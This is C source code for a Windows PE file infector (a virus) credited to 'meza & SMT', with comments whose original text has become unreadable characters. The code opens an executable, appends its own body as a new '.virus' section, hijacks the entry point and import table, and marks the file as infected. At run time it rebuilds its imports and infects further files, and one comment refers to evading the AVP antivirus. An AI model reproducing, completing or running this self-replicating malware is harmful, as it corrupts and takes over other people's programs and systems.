//win32cpp - PE infector 
//authors  - meza & SMT
 
#include <windows.h>


#define WORD4(a,b,c,d) ((a)+(b)*0x100+(c)*0x10000+(d)*0x1000000)
//#pragma pack (4) // �� ����, ��a������ �� �������... ����� ��� �����
                 // ����� ������ � ���������� ������������� �� 4-������� �������

struct GLOBAL { // ���������
    struct { // import directory
        unsigned lookup;
        unsigned linktime, chain;
        unsigned libname;
        unsigned addrtable;
        unsigned nextitem[5];
    } importdir;
    struct { // lookup table
        unsigned func1;
        unsigned func2;
        unsigned funcN;
    } lookup;
    struct { // imported functions
        FARPROC (__stdcall *_GetProcAddress_)(HMODULE, const char *);
        HINSTANCE (__stdcall *_LoadLibrary_)(const char *);
    } imported;
    char libname[16];
    char user[16];
    char getProcAddress[20];
    char loadLibrary[16];
    unsigned entryRVA;
    unsigned prev_import;
    unsigned startRVA;
    unsigned importRVA;
    char createFileA[12];
    char closeHandle[12];
    char readFile[12];
    char writeFile[12];
    char setFilePointer[16];
    char getFileSize[12];
    char exitProcess[12];
    char messageBoxA[12];
    char getModuleHandle[20];
    char goat[16];
    char exception[20];
    char infstart[20];
    char infend[20];
    unsigned importdone;
    unsigned isdll;
} globals = {
    { 0, 0, 0, 0, 0, {0, 0, 0, 0, 0}},
    { 0, 0, 0},
    NULL, NULL,
    "KERNEL32.DLL",
    "USER32.DLL",
    "\0\0GetProcAddress",
    "\0\0LoadLibraryA",
    0, 0, 0, 0,
    "CreateFileA",
    "CloseHandle",
    "ReadFile",
    "WriteFile",
    "SetFilePointer",
    "GetFileSize",
    "ExitProcess",
    "MessageBoxA",
    "GetModuleHandleA",
    "GOAT.EXE",
    "exception occured",
    "infection started",
    "infection ended",
    0,
	0
};

typedef struct { // "����������" ����������
    HANDLE (__stdcall *_CreateFile)(LPCTSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
    BOOL (__stdcall *_CloseHandle)(HANDLE);
    BOOL (__stdcall *_ReadFile)(HANDLE,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);
    BOOL (__stdcall *_WriteFile)(HANDLE,const void *,DWORD,LPDWORD,LPOVERLAPPED);
    DWORD (__stdcall *_SetFilePointer)(HANDLE,LONG,PLONG,DWORD);
    DWORD (__stdcall *_GetFileSize)(HANDLE,LPDWORD);
    FARPROC (__stdcall *_GetProcAddress)(HMODULE, const char *);
    HINSTANCE (__stdcall *_LoadLibrary)(const char*);
    void (__stdcall *_ExitProcess)(UINT);
    int (__stdcall *_MessageBox)(HWND,LPCTSTR,LPCTSTR,UINT);
    HMODULE (__stdcall *_GetModuleHandle)(LPCTSTR);
    struct GLOBAL *globals;
} FUNC;
typedef FUNC *PFUNC;

typedef unsigned (__stdcall *SEHFUNC)(PFUNC);
typedef void (__stdcall *ERRFUNC)(PFUNC);
// ��������� --------------------------
void *delta(void *start);
void lastfunc();
void strcpy(char *, char *);
void strcat(char *, char *);
int infect(PFUNC func, char *name);
unsigned seh(SEHFUNC, ERRFUNC, PFUNC);
unsigned __stdcall search(PFUNC);
void __stdcall infecterror(PFUNC);
// ------------------------------------

#define RVA(x) (unsigned*)((unsigned)base+(unsigned)(x))

#define ALIGN(a,b) (((a-1) | (b-1))+1)

BOOL __stdcall firstfunc(HANDLE p1, DWORD p2, LPVOID p3) { // DllMain, ����� �������� DLL

	FUNC func;
    struct GLOBAL *globals;
    unsigned name;
    unsigned base;

    FARPROC (__stdcall *_GetProcAddress)(HMODULE, const char *);
    HINSTANCE (__stdcall *_LoadLibrary)(const char *);

    globals = func.globals = (struct GLOBAL*)delta((void*)lastfunc);

//��������� ��� ��������� , ���� ��������� , �.� � ������ dll firstfunc
//����� ������� ��� ��� , ��� �������� ����������
int isdll = globals->isdll;
DWORD entryRVA = globals->entryRVA;

	if(isdll)
		base = (unsigned)p1;
	else
//		base = (unsigned)func.api._GetModuleHandle(NULL);

    base = (unsigned)(delta(firstfunc)) - globals->startRVA;

    // ������� ��������� ����� �����... infect() �� ������
    BOOL (__stdcall *entry)(HANDLE,DWORD,LPVOID) = (BOOL(__stdcall*)(HANDLE,DWORD,LPVOID))RVA(globals->entryRVA);
    if (!globals->importdone) // ���� ����� ��� ����,
                              // �� ������ �� �������� �����
                              // (��� �� ��������� thread)
    {
        _GetProcAddress = func._GetProcAddress = globals->imported._GetProcAddress_;
        _LoadLibrary = func._LoadLibrary = globals->imported._LoadLibrary_;

        HINSTANCE kernel = _LoadLibrary((char*)globals->libname);
        HINSTANCE user = _LoadLibrary((char*)globals->user);

        func._CreateFile = (void*(__stdcall*)(const char*,unsigned long,unsigned long,LPSECURITY_ATTRIBUTES,unsigned long,unsigned long,void*))_GetProcAddress(kernel, globals->createFileA);
        func._CloseHandle = (int(__stdcall*)(void*))_GetProcAddress(kernel, globals->closeHandle);
        func._ReadFile = (int(__stdcall*)(void*,void*,unsigned long,unsigned long*,LPOVERLAPPED))_GetProcAddress(kernel, globals->readFile);
        func._WriteFile = (int(__stdcall*)(void*,const void*,unsigned long,unsigned long*,LPOVERLAPPED))_GetProcAddress(kernel, globals->writeFile);
        func._SetFilePointer = (unsigned long(__stdcall*)(void*,long,long*,unsigned long))_GetProcAddress(kernel, globals->setFilePointer);
        func._GetFileSize = (unsigned long(__stdcall*)(void*,unsigned long*))_GetProcAddress(kernel, globals->getFileSize);
        func._ExitProcess = (void (__stdcall*)(unsigned))_GetProcAddress(kernel, globals->exitProcess);
        func._MessageBox = (int (__stdcall*)(HWND,const char*,const char*,unsigned))_GetProcAddress(user, globals->messageBoxA);
        func._GetModuleHandle = (HINSTANCE (__stdcall*)(const char*))_GetProcAddress(kernel, globals->getModuleHandle);

        // ������� ������
        for (unsigned *import1 = RVA(globals->prev_import); name = import1[3]; import1 += 5) {
        // ���� �� dll-�����������
            unsigned lookup = import1[0],
                     addrtable = import1[4];
            if (!lookup) lookup = addrtable;
            unsigned libname = import1[3];
            HINSTANCE hDLL;
            if (!(hDLL = _LoadLibrary((char *)RVA(libname)))) {
                // �������� ��������� windowsNT ����� �� ������ DLL
				//������ ���� ������� :)
                func._ExitProcess(0);
            }
            while (*RVA(lookup)) {
            // ���� �� �������� DLL
                char *funcname = (char*) *RVA(lookup);
                unsigned function;
                if ((unsigned)funcname & 0x80000000) // ������ �� ������
                    function = (unsigned)_GetProcAddress(hDLL, (char*)((unsigned)funcname & 0xFFFF));
                else
                    function = (unsigned)_GetProcAddress(hDLL, ((char*)RVA(funcname))+2);
                // ��������� ������� ������� ������� ����� ������������,
                // ���� ������� ���� �� ��������
                // The FILE.EXE file is
                // linked to missed export LIBRARY.DLL:FunctionName
                *RVA(addrtable) = function;
                lookup += 4; addrtable += 4;
            }
        }

        // ����� ����� ������� ����� �����...
        // ���� ����� ����������� thread, �� ����� ������� ����� ����� ����������
        // ����� delta(), � � �������� ��������� ������� �� �������� func...
        // ����. func->_CreateThread(0, 0, delta(ThreadFunc), &func, 0, &x);
        // ��� ����� �� ��������� read/only � ��� ���������� ����� �����,
        // ��� SetFileAttributes(name, 0);

        seh((SEHFUNC)delta(search), (ERRFUNC)delta(infecterror), &func);

		//���������������
		globals->entryRVA = entryRVA;
		globals->isdll = isdll;
		// ��� dll �� ���� �� ������ , ��� �� ��������
        globals->importdone++; // importdone = 1; // ������ ������ ������ �� ����
    }
    // ������ �����
    return entry(p1, p2, p3);

}

unsigned __stdcall search(PFUNC func) {
    func->_MessageBox(NULL, func->globals->goat, NULL, MB_ICONHAND);
    infect(func, func->globals->goat);
    func->_MessageBox(NULL, func->globals->goat, NULL, MB_ICONHAND);
    return 1;
}
void __stdcall infecterror(PFUNC func) {
    func->_MessageBox(NULL, func->globals->exception, NULL, MB_ICONHAND);
// ������ �� ������� ����
}


// ��������� ������� unsigned __stdcall func(PFUNC param),
// ���������� �������� ���� ������� ���� �� ���� ������, ���
// �������� void __stdcall error(PFUNC param) � ���������� 0,
// ���� ����� ����� ����������.
// � param ����� ������������ ��������� �� ���� ����������
// ����� �������� ��������� ����� seh()
unsigned seh(SEHFUNC func, ERRFUNC error, PFUNC param) {
    unsigned result;
    __asm {
// set SEH
        pushad
        call next
next:   pop ebx
        lea eax,[ebx+SEHproc]
        xor ebx,ebx
        lea ecx,[ebx+next]
        sub eax,ecx
        push eax
        lea ecx,[esp-4]
        xchg ecx,fs:[ebx]
        push ecx
// start of protected section
        push dword ptr [param]
        call dword ptr [func]
        mov [result], eax
// end of protected section
        jmp short SEHok
// exception handler
SEHproc:xor ebx,ebx
        mov eax,fs:[ebx]
        mov esp,[eax]
        pop dword ptr fs:[ebx]
        pop eax
        popad   // restore ebp!
        push [param]
        call [error]
        push 0
        pop [result]
        jmp return
// Restore old SEH
SEHok:  xor ebx,ebx
        pop dword ptr fs:[ebx]
        pop eax
        popad
return:
    }
    return result;
}


void strcpy(char *dst, char *src) {
    while (*dst++ = *src++);
}
void strcat(char *dst, char *src) {
    while (*dst) dst++;
    strcpy(dst, src);
}

void *delta(void *start) {
    __asm {
        call label1
label1: pop eax
        sub eax, offset label1
        add eax, [start]
    }
}

int SeekAndRead(PFUNC func, HANDLE file, int offset, char *buffer, int size) {
    unsigned long len;
    func->_SetFilePointer(file, offset, NULL, FILE_BEGIN);
    if (!func->_ReadFile(file, buffer, size, &len, NULL)) return 0;
    return len;
}

int SeekAndWrite(PFUNC func, HANDLE file, int offset, char *buffer, int size) {
    unsigned long len;
    func->_SetFilePointer(file, offset, NULL, FILE_BEGIN);
    if (!func->_WriteFile(file, buffer, size, &len, NULL)) return 0;
    return len;
}



int infect(PFUNC func, char *name) { // name - ��� PE-�����, � ��������
                            // ��� �������� read/only � ������� �� �������
    HANDLE file; int res = 0;
    char MZ[0x40], PE[0x100], object[0x28];
    unsigned pe_header;

    file = func->_CreateFile(name, GENERIC_READ | GENERIC_WRITE,
                             0, NULL, OPEN_EXISTING, 0, NULL);
    if (file == INVALID_HANDLE_VALUE) return 0;
    if (SeekAndRead(func, file, 0, MZ, 0x40)) {
        if (SeekAndRead(func, file, pe_header = *(unsigned*)(MZ+0x3C), PE, 0x100)) {
            // ���� ����� ����� == 0x98765432 �� ���� ��� �������
            if (*(unsigned*)(PE+8) != 0x98765432 && *(unsigned*)PE == WORD4('P', 'E', 0, 0)) {
                unsigned o_object = pe_header + *(unsigned short*)(PE+0x14) + 0x18;

                if (SeekAndRead(func, file, o_object + *(unsigned short*)(PE+6)*0x28, object, 0x28)) {
                    char i;
                    for (char r = i = 0; i < 0x28; i++)
                        r |= object[i]; // �� ������� ����� � ������� �������� ?
                    if (!r) { // ����� ����!
                        // ������� ������ ���������� ��� ������. ��� �����
                        // ��� ���� ����� ����� ������ ������
                        for (unsigned short k = 0; k < *(unsigned short*)(PE+6); k++) {
                            SeekAndRead(func, file, o_object + k*0x28, object, 0x28);
                            object[0x27] |= 0xC0;
                            SeekAndWrite(func, file, o_object + k*0x28, object, 0x28);
                        }
                        *(unsigned*)(PE+8) = 0x98765432;

                        // ��������� ��� ������ (�� ����� 8 ��������)
                        // ����� ������������ �� .virus � .code, .data,
                        // .reloc, CODE, DATA ��� ������� �����������,
                        // ���� ������ � ������ ����� kdgg423 ������� ��������.
                        // ��� ����� ��������� ������...
                        *(unsigned*)(object) = WORD4('.','v','i','r');
                        *(unsigned*)(object+4) = WORD4('u','s',0,0);

                        unsigned virsize = (unsigned)lastfunc - (unsigned)firstfunc,
                                 virtsize = ALIGN(virsize+sizeof(globals), *(unsigned*)(PE+0x38)),
                                 startRVA = *(unsigned*)(PE+0x50),
                                 physsize = ALIGN(virsize+sizeof(globals), *(unsigned*)(PE+0x3c)),
                                 importRVA = startRVA + virsize,
                                 FileSize = ALIGN(func->_GetFileSize(file, NULL), *(unsigned*)(PE+0x3c));

                        *(unsigned*)(object+8) = virtsize;
                        *(unsigned*)(object+0x0c) = startRVA;
                        *(unsigned*)(object+0x10) = physsize;
                        *(unsigned*)(object+0x14) = ALIGN(FileSize, *(unsigned*)(PE+0x3c));
                        *(unsigned*)(object+0x24) = 0xE0000020; // flags: code section, read, write, execute
                                                  // write ����� ���� �
                                                  // globals ���� �� ������ ���������...
                                                  // C����� ���� � ������������ ������
                                                  // ����� ���������� �������� ��������. ������� AVP
                        *(unsigned*)(PE+0x50) += virtsize;
                        func->globals->prev_import = *(unsigned*)(PE+0x80);
                        *(unsigned*)(PE+0x80) = importRVA;
                        func->globals->entryRVA = *(unsigned*)(PE+0x28);
                        *(unsigned*)(PE+0x28) = startRVA;
                        SeekAndWrite(func, file, o_object + *(unsigned short*)(PE+6)*0x28, object, 0x28);
                        (*(unsigned short*)(PE+6))++; // ���-�� ������
                        // ��������� �������
                        func->globals->startRVA = startRVA;
                        func->globals->importRVA = importRVA;
                        func->globals->importdir.lookup = importRVA - (unsigned)func->globals + (unsigned)&(func->globals->lookup);
                        func->globals->importdir.libname = importRVA - (unsigned)func->globals + (unsigned)&(func->globals->libname);
                        func->globals->importdir.addrtable = importRVA - (unsigned)func->globals + (unsigned)&(func->globals->imported);
                        func->globals->lookup.func1 = importRVA - (unsigned)func->globals + (unsigned)&(func->globals->getProcAddress);
                        func->globals->lookup.func2 = importRVA - (unsigned)func->globals + (unsigned)&(func->globals->loadLibrary);
                        func->globals->imported._GetProcAddress_ = (FARPROC(__stdcall*)(HMODULE,const char*))(importRVA + ((unsigned)&(func->globals->getProcAddress) - (unsigned)func->globals));
                        func->globals->imported._LoadLibrary_ = (HINSTANCE(__stdcall*)(const char*))(importRVA + ((unsigned)&(func->globals->loadLibrary) - (unsigned)func->globals));
                        func->globals->importdir.linktime = func->globals->importdir.chain = 0;
                        func->globals->importdone = 0; // ������� ������� �������
						if(*(unsigned short*)(PE+0x16) & IMAGE_FILE_DLL)
                        func->globals->isdll = 1; // ��� dll
						else
						func->globals->isdll = 0;

                        // ����������� �����
                        SeekAndWrite(func, file, pe_header, PE, 0x100);
                        SeekAndWrite(func, file, FileSize, (char*)delta(firstfunc), virsize);
                        SeekAndWrite(func, file, FileSize+virsize, (char*)func->globals, physsize - virsize);
                        res = 1;
                    }
                }
            }
        }
    }
    func->_CloseHandle(file);
    return res;
}

void lastfunc() {};

void __cdecl main(int nCountArg, char *lpszArg[], char *lpszEnv[]) {
    FUNC func;
    func._CreateFile = CreateFileA;
    func._CloseHandle = CloseHandle;
    func._ReadFile = ReadFile;
    func._WriteFile = WriteFile;
    func._SetFilePointer = SetFilePointer;
    func._GetFileSize = GetFileSize;
    func._ExitProcess = ExitProcess;
    func._GetProcAddress = GetProcAddress;
    func._LoadLibrary = LoadLibrary;
    func._MessageBox = MessageBox;
    func._GetModuleHandle = GetModuleHandle;

    func.globals = &globals;
    infect(&func, lpszArg[1]);
}
